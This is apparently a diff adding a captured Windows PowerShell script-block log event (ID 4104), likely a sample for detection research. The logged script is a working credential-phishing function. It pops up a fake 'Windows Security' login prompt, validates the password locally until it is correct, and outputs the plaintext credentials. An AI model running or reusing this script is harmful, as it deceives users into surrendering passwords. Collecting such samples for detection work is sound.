@@ -1,0 +1,52 @@
+{
+  "Event": {
+    "#attributes": {
+      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
+    },
+    "System": {
+      "Provider": {
+        "#attributes": {
+          "Name": "Microsoft-Windows-PowerShell",
+          "Guid": "A0C1853B-5C40-4B15-8766-3CF1C58F985A"
+        }
+      },
+      "EventID": 4104,
+      "Version": 1,
+      "Level": 3,
+      "Task": 2,
+      "Opcode": 15,
+      "Keywords": "0x0",
+      "TimeCreated": {
+        "#attributes": {
+          "SystemTime": "2019-09-09T13:35:09.315230Z"
+        }
+      },
+      "EventRecordID": 1123,
+      "Correlation": {
+        "#attributes": {
+          "ActivityID": "B5ABE6C2-675C-0001-A601-ACB55C67D501"
+        }
+      },
+      "Execution": {
+        "#attributes": {
+          "ProcessID": 5500,
+          "ThreadID": 356
+        }
+      },
+      "Channel": "Microsoft-Windows-PowerShell/Operational",
+      "Computer": "MSEDGEWIN10",
+      "Security": {
+        "#attributes": {
+          "UserID": "S-1-5-21-3461203602-4096304019-2269080069-1000"
+        }
+      }
+    },
+    "EventData": {
+      "MessageNumber": 1,
+      "MessageTotal": 1,
+      "ScriptBlockText": "function Invoke-LoginPrompt{\n$cred = $Host.ui.PromptForCredential(\"Windows Security\", \"Please enter user credentials\", \"$env:userdomain\\$env:username\",\"\")\n$username = \"$env:username\"\n$domain = \"$env:userdomain\"\n$full = \"$domain\" + \"\\\" + \"$username\"\n$password = $cred.GetNetworkCredential().password\nAdd-Type -assemblyname System.DirectoryServices.AccountManagement\n$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)\nwhile($DS.ValidateCredentials(\"$full\",\"$password\") -ne $True){\n    $cred = $Host.ui.PromptForCredential(\"Windows Security\", \"Invalid Credentials, Please try again\", \"$env:userdomain\\$env:username\",\"\")\n    $username = \"$env:username\"\n    $domain = \"$env:userdomain\"\n    $full = \"$domain\" + \"\\\" + \"$username\"\n    $password = $cred.GetNetworkCredential().password\n    Add-Type -assemblyname System.DirectoryServices.AccountManagement\n    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)\n    $DS.ValidateCredentials(\"$full\", \"$password\") | out-null\n    }\n $output = $newcred = $cred.GetNetworkCredential() | select-object UserName, Domain, Password\n $output\n R{START_PROCESS}\n}\nInvoke-LoginPrompt",
+      "ScriptBlockId": "c7ca7056-b317-4fff-b796-05d8ef896dcd",
+      "Path": ""
+    }
+  }
+}
